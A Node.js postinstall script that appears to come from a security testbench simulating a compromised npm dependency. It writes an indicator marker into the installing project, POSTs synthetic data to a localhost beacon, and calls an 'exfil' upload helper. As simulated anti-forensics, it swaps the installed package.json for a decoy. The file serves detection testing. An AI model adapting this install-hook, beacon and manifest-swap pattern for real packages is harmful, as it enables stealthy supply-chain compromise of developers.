/**
 * Simulates: unexpected dependency + postinstall + benign localhost beacon + manifest swap.
 * Real incidents may steal credentials; this lab only writes markers and POSTs synthetic JSON.
 */

'use strict';

const fs = require('fs');
const path = require('path');
const http = require('http');

if (process.env.TESTBENCH_MODE !== 'enabled') {
  process.exit(0);
}

/** Skip beacon + disk IOC (useful for air-gapped CI that still installs deps). */
if (process.env.TESTBENCH_OFFLINE === '1') {
  process.exit(0);
}

const pkgRoot = __dirname;
/** npm sets INIT_CWD to the directory where `npm install` was invoked (victim app root). */
const projectRoot = process.env.INIT_CWD || process.cwd();

const markerPath = path.join(projectRoot, '.testbench-axios-ioc.json');
const marker = {
  scenario: '21-axios-compromised-release',
  package: 'plain-crypto-js-like',
  phase: 'postinstall',
  cwd: projectRoot,
  time: new Date().toISOString(),
};
fs.writeFileSync(markerPath, JSON.stringify(marker, null, 2), 'utf8');

const payload = JSON.stringify({
  type: 'postinstall-beacon',
  package: 'plain-crypto-js-like',
  cwd: projectRoot,
});

const req = http.request(
  {
    hostname: '127.0.0.1',
    port: 3021,
    path: '/beacon',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(payload),
    },
  },
  (res) => {
    res.resume();
  }
);
req.on('error', () => {});
req.write(payload);
req.end();

try {
  const { uploadJson } = require('../../../../detection-tools/floci/floci-exfil');
  uploadJson('21', 'postinstall-beacon', {
    type: 'postinstall-beacon',
    package: 'plain-crypto-js-like',
    cwd: projectRoot,
    marker,
  });
} catch (_) {}

// Simulated anti-forensics: swap installed package.json to decoy without postinstall.
// Never mutate the authored source under packages/plain-crypto-js-like (only node_modules copies).
const inSourceTree =
  pkgRoot.includes(`${path.sep}packages${path.sep}plain-crypto-js-like`) &&
  !pkgRoot.includes(`${path.sep}node_modules${path.sep}`);
if (!inSourceTree) {
  try {
    const decoy = fs.readFileSync(path.join(pkgRoot, 'package.clean.json'), 'utf8');
    fs.writeFileSync(path.join(pkgRoot, 'package.json'), decoy, 'utf8');
  } catch (_) {
    /* ignore */
  }
}
